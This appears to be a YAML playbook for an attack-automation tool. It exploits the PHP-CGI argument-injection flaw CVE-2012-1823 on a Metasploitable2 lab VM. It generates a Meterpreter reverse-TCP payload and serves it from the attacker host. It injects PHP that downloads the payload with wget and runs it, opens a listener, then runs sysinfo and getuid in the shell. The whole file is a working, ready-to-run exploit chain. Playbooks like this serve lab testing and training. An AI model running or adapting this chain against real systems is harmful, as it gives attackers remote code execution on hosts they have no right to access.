#
# Author: Wolfgang Hotwagner, Erik Grafendorfer
# Description:
#     This playbook perfoms the following attack-steps:
#     1. Create a temporary file for the reverse-shell payload
#     2. Generate the payload
#     3. Serve the payload via webserv in background
#     4. Exploit CVE-2012-1823 and inject a command to download the reverse shell
#     5. Start a muli handler to listen for the reverse shell
#     6. Exploit CVE-2012-1823 and inject a command to execute the reverse shell
#     7. Run commands in the reverse shell
#
# Requirements:
#     1. Run this on kali-linux
#     2. Metasploit installed and msfrpd executed
#     3. Target a Metasploitable2-VM
#
vars:
  METASPLOITABLE: 192.168.0.146
  ATTACKER: 192.168.0.29
  PAYLOAD: linux/x86/meterpreter/reverse_tcp
  LPORT: "4344"
  PHP_CGI_URL: "http://192.168.0.146/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
  PHP_DOWNLOAD: /tmp/attackmate_php_download.php
  PHP_EXECUTE: /tmp/attackmate_php_execute.php

commands:
  # create a temporary file for a reverse shell payload
  - type: mktemp
    cmd: file
    variable: RSHELL

  # generate reverse shell
  - type: msf-payload
    cmd: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
    format: elf
    local_path: $RSHELL

  # serve the reverse shell via webserver in background mode
  - type: webserv
    local_path: $RSHELL
    port: 8080
    background: true

  # create raw PHP body for the download request
  - type: shell
    cmd: "cat > $PHP_DOWNLOAD <<'EOF'\n<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL');?>\nEOF"

  # Inject code that downloads the reverse shell from the webserver
  - type: http-client
    cmd: POST
    url: $PHP_CGI_URL
    headers:
      Accept: "*/*"
      Accept-Encoding: identity
      Connection: close
    local_path: $PHP_DOWNLOAD

  # Start a reverse shell listener in background
  - type: msf-module
    creates_session: shell
    cmd: exploit/multi/handler
    payload: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
    background: true
    kill_on_exit: true

  # create raw PHP body for the execution request
  - type: shell
    cmd: "cat > $PHP_EXECUTE <<'EOF'\n<?php system('chmod +x /tmp/shell && /tmp/shell &');?>\nEOF"

  # Execute the reverse shell
  - type: http-client
    cmd: POST
    url: $PHP_CGI_URL
    headers:
      Accept: "*/*"
      Accept-Encoding: identity
      Connection: close
    local_path: $PHP_EXECUTE
    background: true
    kill_on_exit: true

  # Run commands using the reverse shell
  - type: msf-session
    session: shell
    cmd: sysinfo

  - type: msf-session
    session: shell
    cmd: getuid
